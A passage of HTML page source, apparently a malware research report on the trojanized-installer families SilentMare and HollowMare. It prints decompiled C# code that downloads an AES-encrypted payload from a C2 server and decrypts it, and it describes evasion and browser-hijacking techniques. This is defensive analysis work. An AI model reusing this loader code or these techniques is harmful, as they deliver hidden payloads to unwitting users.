+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;webClient&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DefaultRequestHeaders&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;InstallTime&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;installDate&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;webClient&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DefaultRequestHeaders&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;Time&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;FSharpAsync&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;string&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;computation&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;FSharpAsync&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AwaitTask&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;string&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;webClient&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetStringAsync&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// Method that process the downloaded payload.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;override&lt;/span&gt; &lt;span class="n"&gt;FSharpAsync&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;IEnumerable&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;IEnumerable&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;value&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;JsonConvert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DeserializeObject&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;IEnumerable&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&amp;gt;&amp;gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;@this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;installDate&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;currentDate&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;AsyncPrimitives&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MakeAsync&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;IEnumerable&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&amp;gt;&amp;gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;FSharpFunc&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;AsyncActivation&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;IEnumerable&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&amp;gt;&amp;gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;AsyncReturn&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;)&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;GetUpdates&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="m"&gt;21&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;value&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;UpdateGatherer&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;// Method used to decrypt the payload from the C2 server.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;internal&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;installDate&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;currentDate&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;Aes&lt;/span&gt; &lt;span class="n"&gt;aes&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Aes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Create&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;aes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Key&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SHA256&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Create&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;ComputeHash&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UTF8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;installDate&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;aes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IV&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MD5&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Create&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;ComputeHash&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UTF8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;currentDate&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;MemoryStream&lt;/span&gt; &lt;span class="n"&gt;stream&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;MemoryStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;JsonConvert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DeserializeObject&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&amp;gt;(&lt;/span&gt;&lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;ICryptoTransform&lt;/span&gt; &lt;span class="n"&gt;transform&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;aes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CreateDecryptor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;aes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;aes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IV&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;CryptoStream&lt;/span&gt; &lt;span class="n"&gt;stream2&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;CryptoStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stream&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;transform&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CryptoStreamMode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Read&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;StreamReader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stream2&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;ReadToEnd&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Substring&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h3&gt;Fall 2025 Era (Native Time)&lt;span class="hx:absolute hx:-mt-20" id="fall-2025-era-native-time"&gt;&lt;/span&gt;
+&lt;a href="#fall-2025-era-native-time" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In the Fall of 2025, we saw a new era. Starting with &lt;em&gt;Rapid Doc&lt;/em&gt; at the end of
+September and most recently &lt;em&gt;ZapPDF&lt;/em&gt; at the beginning of December. &lt;em&gt;Rapid Doc&lt;/em&gt;
+uses a custom installer packaged in a modified implementation of
+&lt;a href="https://github.com/pyinstaller"target="_blank" rel="noopener"&gt;PyInstaller&lt;/a&gt;. The PyInstaller uses a different
+&lt;em&gt;footer&lt;/em&gt;, so most tooling can&amp;rsquo;t unpack the embedded files. Additionally, an
+additional &amp;ldquo;custom&amp;rdquo; encryption has been added to the embedded files. All the
+files in the &lt;em&gt;PYZ&lt;/em&gt; archive (which also uses different magic bytes) need a round
+of &lt;em&gt;XOR&lt;/em&gt; with a short key, decompression with &lt;em&gt;zlib&lt;/em&gt;, followed by &lt;em&gt;XOR&lt;/em&gt; with
+another short key. The keys are different between different PyInstallers. For
+example, the embedded client application is also packaged with PyInstaller and
+uses a different set of keys. &lt;em&gt;ZapPDF&lt;/em&gt;, first found in December 2025, moved
+back to use a custom installer written in C#.&lt;/p&gt;
+&lt;p&gt;A big change with the installer in this era is that they do not contain the
+SilentMare component. Instead, the updater component is downloaded by the
+installer. The updater has been reimplemented in C++ instead of F#. The
+functionality between the two SilentMare versions installed by &lt;em&gt;Rapid Doc&lt;/em&gt; and
+&lt;em&gt;ZapPDF&lt;/em&gt; is very similar. The main difference is that the most recent version
+expects an ASCII85 encoded payload, whereas previous versions used Base64
+encoding of the encrypted data. In both of these C++ versions, the AES key is
+derived by hashing a hardcoded string that is stored in the binary. The same
+hardcoded string is used as the &lt;em&gt;XOR&lt;/em&gt; key when encrypting the telemetry sent
+back to the C2 server.&lt;/p&gt;
+&lt;h2&gt;HollowMare&lt;span class="hx:absolute hx:-mt-20" id="hollowmare"&gt;&lt;/span&gt;
+&lt;a href="#hollowmare" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;HollowMare is another Trojan family that we are currently tracking. We have
+seen two different types of malware families: one that installs an extension
+without the user knowing, and another that hijacks the browser&amp;rsquo;s default search
+engine. Compared to other Trojan families in this report, no functional
+application is provided to the user. The Trojan uses a custom installer that
+creates a shortcut on the user&amp;rsquo;s desktop, adds an uninstaller, and registers
+itself in the Windows application list so it can be uninstalled. Because we did
+not identify any malicious intent, we classify this family as a PUA rather than
+malware.&lt;/p&gt;
+&lt;p&gt;The first variant, which installs a browser extension, was tracked back to May
+2025 and was spread via a fake application called &lt;em&gt;ConvertyFile&lt;/em&gt;. The installer
+is written in Go and drops an uninstaller written in the same language. The
+first thing the installer does when it&amp;rsquo;s executed is to contact the C2 server.
+The C2 server informs the installer which extension to install and in which web
+browser. The installer creates a window that covers the whole screen so the
+user can&amp;rsquo;t see what&amp;rsquo;s happening while the installation is in progress. Behind
+the full-screen window, the installer opens up a new browser window. Using
+virtual keyboard messages sent to the browser window, the installer navigates
+to the extensions installation page and installs the extension as if the user
+had done so manually. Once the extension has been installed, the installer
+navigates to a &amp;ldquo;Thank You&amp;rdquo; page displayed to the user after the installation.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;## Some of the metadata extracted from the Converty File Installer
+Compiler 1.23.4 (2024-12-03)
+Build ID NXWcL1Pq14dOHrPjvWSd/WvQDkDRRmdLbZKJcZ8sU/asI5RZbGH0dIVoQZSh3R/IU3sCUsRT-mcUcDOVHWd
+Main root ConvertyFile
+# main 5
+# std 128
+# vendor 12
+vcs git
+vcs.revision f8f4176537e9f6e757779c7adb8fba75e93c478f
+vcs.time 2025-05-18T12:48:54Z
+vcs.modified true&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;The second variant we identified is a fake application called &lt;em&gt;OneZip&lt;/em&gt;. The
+first publicly available sample we found was uploaded to VirusTotal in November
+2025. This application is built from the same code base as ConvertyFile.
+Instead of installing a browser extension, this version modifies a single file
+in the browser&amp;rsquo;s profile folder. The specific file is determined by the C2
+server, which also performs the modification. The installer simply uploads the
+file to the server and overwrites the local file with the server&amp;rsquo;s response. We
+are assuming it&amp;rsquo;s a configuration file because any running browser process is
+killed before the overwrite, to ensure it doesn&amp;rsquo;t undo the change made by the
+installer. The OneZip installer only targets Firefox.&lt;/p&gt;
+&lt;p&gt;A similar functionality is used by &lt;em&gt;CrystalPDF&lt;/em&gt;, a fake application reported in
+&lt;a href="https://x.com/struppigel/status/1977691895250772086"target="_blank" rel="noopener"&gt;October&lt;/a&gt; 2025 by Karsten
+Hahn, and &lt;em&gt;PowerDoc&lt;/em&gt;. These fake applications share very similar behavior with
+OneZip but are written in F# and C# instead of Go. CrystalPDF also targets
+Google Chrome in addition to Firefox. This variant also added a scheduled task
+so the application runs once per day and ensures its effects haven&amp;rsquo;t been
+reverted.&lt;/p&gt;
+&lt;p&gt;In January 2026, we discovered another fake application, &lt;em&gt;SagePDF&lt;/em&gt;. The
+application is written in C# and shares a similar PDB path to CrystalPDF
+(&lt;code&gt;C:\Git\f-ver2\Fv2Ui&lt;/code&gt; vs &lt;code&gt;C:\Git\v4_application\&lt;/code&gt;). The path suggests SagePDF
+is the fourth generation. In this generation, search engine hijacking is
+performed by interacting with the browser window, as with ConvertyFile. This
+logic is implemented as a separate executable, XOR-encrypted within the main
+binary. The persistence mechanism was also dropped. Since SagePDF is designed
+to hijack the user&amp;rsquo;s default search engine in the browser, we assume that both
+OneZip and CrystalPDF have the same intent.&lt;/p&gt;
+&lt;p&gt;When SagePDF runs, it checks for the presence of an install ID stored at
+&lt;code&gt;%TEMP%\UID\UID.txt&lt;/code&gt;. This same file is checked by another fake application
+called &lt;em&gt;PDFDoc&lt;/em&gt;. The version of PDFDoc we have obtained does not do anything
+malicious but it does share some more similarities with SagePDF. For example,
+both have a video that is played to the user during the install. The resource
+names are similar: &lt;code&gt;Sage.Files.SageAnimation.mp4&lt;/code&gt; and
+&lt;code&gt;Doc.Files.PdfDocAnimation.mp4&lt;/code&gt;. Additionally, encryption logic is implemented
+under the namespace &lt;code&gt;Cod&lt;/code&gt;: &lt;code&gt;Sage.Models.Cod&lt;/code&gt; and &lt;code&gt;Doc.Modles.Cod&lt;/code&gt;. The &lt;code&gt;Modles&lt;/code&gt;
+in PDFDoc is likely a typo.&lt;/p&gt;
+&lt;p&gt;PDFDoc is signed by a certificate issued to an organization called &lt;em&gt;TAMARISK
+INTERACTIVE LTD&lt;/em&gt;. A different certificate issued to the same organization was
+used to sign an application called &lt;em&gt;PowerPlayer&lt;/em&gt;. This variant performs search
+engine hijacking. The method used is the same keystroke injection method as
+used by ConvertyFile and SagePDF.&lt;/p&gt;
+&lt;p&gt;Overall, HollowMare&amp;rsquo;s only goal is either to force-install a browser extension
+or to change the user&amp;rsquo;s default search engine. Most of the time, the installer
+does not include an application. Instead, the installer is only used to perform
+the modifications to the user&amp;rsquo;s browser. Once the installer is done, it sends
+the user to a web application with the functionality the user is looking for.&lt;/p&gt;
+&lt;h2&gt;Attribution&lt;span class="hx:absolute hx:-mt-20" id="attribution"&gt;&lt;/span&gt;
+&lt;a href="#attribution" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;When we compare SilentMare and HollowMare to each other, we see some
+similarities and some differences. They are both delivered via a custom-made
+installer that creates a desktop shortcut and adds uninstalling instructions to
+the Windows registry. The installers collect telemetry at each step of the
+installation process. Additionally, both families track the installed machine
+via a generated &lt;em&gt;GUID&lt;/em&gt; that is stored in a flat file.&lt;/p&gt;
+&lt;p&gt;The use of a custom installer allows the threat actor to perform hidden
+activity on the user&amp;rsquo;s machine while the installer is running. Both families
+use string obfuscations to hide some of these activities from static analyzers.
+While both obfuscate the strings, the techniques used are different except for
+one instance where string reversal was used. Another shared anomaly is the
+time-stomping of the PE timestamp with a future timestamp.&lt;/p&gt;
+&lt;p&gt;On the implementation side, the two families are very different. Both are using
+multiple programming languages. HollowMare&amp;rsquo;s language change appears more as an
+evolution while SilentMare does it as part of staying undetected. The two
+families also operate differently on the infected machine. For SilentMare,
+persistence is important. It&amp;rsquo;s one of the first things the installer sets up.
+HollowMare&amp;rsquo;s operation is more of a quick in-and-out. Perform the changes and
+leave before the user realizes what has happened.&lt;/p&gt;
+&lt;p&gt;Both families utilize some encryption but differently. HollowMare uses simple
+XOR encryption using a short key for everything. SilentMare uses the same type
+of encryption, but only for the telemetry data. The downloaded payloads are
+encrypted with AES, which shows that SilentMare really wants to make sure the
+payload is not captured. The network communication with the C2 server is
+already performed over TLS, so this additional payload encryption ensures that
+TLS-intercepting solutions do not capture the payload in plain format.&lt;/p&gt;
+&lt;p&gt;While the code doesn&amp;rsquo;t show much shared between the two families, a view of the
+infrastructure shows something different. First off, both families use
+different, unconnected domains for different tasks. The domain hosting the
+application, where users are lured via ads, is completely separate from the
+&amp;ldquo;C2&amp;rdquo; domains. SilentMare even uses different domains for the telemetry and the
+payloads. When we look at the application hosting infrastructure we can see
+that they are connected. For example, the response header hash
+&lt;a href="https://pilot.validin.com/detail?find=e5e01ee754e24e3039d4#tab=host_pairs"target="_blank" rel="noopener"&gt;e5e01ee754e24e3039d4&lt;/a&gt;
+produced by &lt;a href="https://www.validin.com/"target="_blank" rel="noopener"&gt;Validin&lt;/a&gt; matched domains hosting the
+SilentMare applications: ZapPDF, RapidDoc, PDFSkills, Easy2Convert, and
+ConvertMate; and HollowMare applications: OneZip, PowerDoc, ConvertyFile, and
+CrystalPDF. Another header hash, for example
+&lt;a href="https://pilot.validin.com/detail?find=ede0ea86de24c452cb25#tab=host_pairs"target="_blank" rel="noopener"&gt;ede0ea86de24c452cb25&lt;/a&gt;
+was returned by servers serving both SilentMare (Easy2Convert and ConvertMate)
+and HollowMare (PowerPlayer, PDFDoc, OneZip, and ConvertyFile).&lt;/p&gt;
+&lt;p&gt;Additionally, the certificates used to sign both SilentMare and HollowMare
+applications have been issued for Israeli entities based in Tel Aviv and the
+neighboring cities Herzliya and Ra’anana. The name of the companies use a
+similar format. This suggests that they are obtained from the same broker.&lt;/p&gt;
+&lt;p&gt;From our analysis, we cannot conclude that SilentMare and HollowMare are
+developed by the same threat actor. They do share some of the infrastructure
+but this is not enough to conclude that the same threat actor is behind it. Our
+theory is, either the threat actors are using the same supplier for
+certificates and website building or they are independent suppliers to a third
+threat actor that uses their malware.&lt;/p&gt;
+&lt;h2&gt;Conclusion&lt;span class="hx:absolute hx:-mt-20" id="conclusion"&gt;&lt;/span&gt;
+&lt;a href="#conclusion" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Trojanized utility applications have made a strong comeback in 2024 and 2025.
+SilentMare and HollowMare are two of the families spreading via this delivery
